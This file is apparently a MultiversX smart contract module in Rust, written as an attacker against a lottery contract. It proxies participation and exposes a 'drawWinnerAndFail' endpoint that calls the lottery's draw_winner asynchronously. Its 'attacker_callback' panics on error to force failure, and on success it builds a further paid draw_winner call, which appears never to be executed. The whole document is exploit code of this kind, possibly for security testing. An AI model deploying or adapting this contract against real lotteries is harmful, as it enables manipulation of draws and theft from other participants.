multiversx_sc::imports!();
use lottery::ProxyTrait as _;
pub const ONE_EGLD: u64 = 1_000_000_000_000_000_000;

#[multiversx_sc::module]
pub trait LotteryProxy<RequestedResult>
{
    #[proxy]
    fn lottery_contract_proxy(
        &self,
        lottery_sc_address: ManagedAddress,
    ) -> lottery::Proxy<Self::Api>;

    #[payable("*EGLD")]
    #[endpoint(participate)]
    fn participate(&self, lottery_sc_address: ManagedAddress, amount: BigUint) {
        let _result: bool = self.lottery_contract_proxy(lottery_sc_address)
            .participate()
            .with_egld_transfer(amount)
            .execute_on_dest_context();
    }

    #[payable("EGLD")]
    #[endpoint(drawWinnerAndFail)]
    fn attack_async(&self, lottery_sc_address: ManagedAddress) {
        self.lottery_contract_proxy(lottery_sc_address.clone())
            .draw_winner()
            .async_call()
            .with_callback(
                self.callbacks()
                    .attacker_callback(&lottery_sc_address),
            )
            .call_and_exit()
    }

    #[callback]
    fn attacker_callback(
        &self,
        address: &ManagedAddress,
        #[call_result] result: ManagedAsyncCallResult<()>,
    ) -> () {
        match result {
            ManagedAsyncCallResult::Ok(value) => {
                let _ = self.lottery_contract_proxy(address.clone())
                    .draw_winner()
                    .with_egld_transfer(BigUint::from(ONE_EGLD));
            }
            ManagedAsyncCallResult::Err(value) => {
                let panic_message = value.err_msg;
                panic!("{}", panic_message);
            }
        }
    }

    #[view(getLotteryScAddress)]
    #[storage_mapper("lotteryScAddress")]
    fn lottery_sc_address(&self) -> SingleValueMapper<ManagedAddress>;
}
